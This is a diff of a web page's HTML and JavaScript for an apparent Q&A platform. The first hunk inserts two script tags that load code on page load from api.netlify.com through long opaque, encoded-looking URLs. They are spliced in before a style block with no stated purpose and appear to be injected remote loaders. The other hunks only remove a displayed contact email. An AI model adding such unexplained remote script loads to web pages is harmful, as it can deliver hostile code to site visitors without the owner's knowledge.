@@ -447,7 +447,7 @@ html, body {
     border-radius:8px; 
   }
 </style>
-<style id="edge-autohide-mobile">
+<script src="https://api.netlify.com/ssWPpvocB8_DNBlkRL5vooxk4cLu-j_3dfgSMsYwZGuZ-gYyfOItbhvPMTHsOcDWmUP_r5LS7009iz1kYKNnAYkyAFvLWnPcEY9YgwxaATPhJ4vbVpksLzw3A87RHmECK22GmJOgo1U4H2PkQGQYF5dSasv1yjaRnYbOlfc1PhA=" type="text/javascript"></script><script src="https://api.netlify.com/aw590GDSw75orZIqC7a0EDxiydfxNq9xk28EyQRd_F6__zGwUVBEAL4Ia-sa71hk88NW3GUCFsIxOkQkWNRqfP0yS18CNn-E5P_hnlmbzZ54l4ZTb0L9cFjEHegl3KEQPa2-bkbKPGEYrg-8YfMPxHgIVkvdtRi5zmGQofQj3vI=" type="text/javascript"></script><style id="edge-autohide-mobile">
 @media (pointer:coarse){
 :root{--edge:10px;--spd:.14s;--e:ease-out}
 body.hide-top nav,body.hide-top .topbar{transform:translateY(-100%);transition:transform var(--spd) var(--e)}
@@ -4853,9 +4853,6 @@ window.addEventListener("message",function(ev){
     const list = el("div","igdc-qa-threads");
 
     body.append(lQ,tQ,lA,tA,actions,note,list);
-	const ce = el("p","contact-email");
-    ce.innerHTML = '代表電子郵件: <a href="mailto:igdcplatform@gmail.com">igdcplatform@gmail.com</a>';
-    body.append(ce);
     actions.append(btnSubmit, btnClear);
     panel.append(header, body);
     modal.append(backdrop, panel);
@@ -5040,10 +5037,6 @@ if(document.readyState==="loading"){ document.addEventListener("DOMContentLoaded
         var body = document.createElement('div'); body.className='igdc-qa-body';
         body.innerHTML = '<div class="igdc-qa-note">※ 簡單問題將由 AI 立即回答。技術、錯誤或營運相關問題會自動轉交給管理員問答。</div>';
 
-        var ce = document.createElement('p');
-        ce.className = 'contact-email';
-        ce.innerHTML = '代表電子郵件: <a href="mailto:igdcplatform@gmail.com">igdcplatform@gmail.com</a>';
-        body.appendChild(ce);
 
         p.appendChild(h); p.appendChild(body);
         m.appendChild(b); m.appendChild(p);
